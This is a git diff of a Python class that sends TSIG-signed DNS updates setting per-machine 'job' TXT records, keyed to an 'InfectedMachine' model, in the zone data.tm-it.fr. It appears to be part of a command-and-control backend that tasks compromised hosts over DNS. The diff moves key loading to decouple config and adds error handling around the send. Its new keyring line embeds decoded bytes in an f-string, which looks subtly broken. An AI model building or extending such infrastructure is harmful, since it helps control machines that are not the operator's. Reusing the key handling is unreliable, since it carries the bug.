@@ -1,10 +1,9 @@
 import base64
-import os
-import traceback
 from typing import Self
 
 import dns
 import dns.query
+from decouple import config
 from dns import tsigkeyring
 from dns.update import Update
 
@@ -13,16 +12,10 @@ from djangoproject.models import InfectedMachine
 
 class DnsService:
     def __init__(self):
-        self.updater = None
-        try:
-            key_name = os.environ.get('DNS_ZONE_KEY_NAME', '')
-            self.keyring = tsigkeyring.from_text({
-                key_name: os.environ.get('DNS_ZONE_KEY'),
-            })
-            self.updater = Update("data.tm-it.fr", keyring=self.keyring, keyname=dns.name.from_text(key_name))
-        except Exception as e:
-            print(e)
-            traceback.print_exc()
+        key_name = config('DNS_ZONE_KEY_NAME')
+        secret = base64.b64decode(config('DNS_ZONE_KEY'))
+        self.keyring = tsigkeyring.from_text({key_name: f"hmac-sha256:{secret}",})
+        self.updater = Update("data.tm-it.fr", keyring=self.keyring, keyname=dns.name.from_text(key_name))
 
     def set_job_txt(self, machine: InfectedMachine, txt_value: str) -> Self:
         if self.updater is None: return self
@@ -41,5 +34,8 @@ class DnsService:
         if self.updater is None: return
 
         print("DNS: about to send update", flush=True)
-        response = dns.query.tcp(self.updater, "127.0.0.1")
-        print(f"DNS update response: {response}", flush=True)
+        try:
+            response = dns.query.tcp(self.updater, "127.0.0.1")
+            print(f"DNS update response: {response}", flush=True)
+        except Exception as e:
+            print(f"DNS update error: {e}", flush=True)
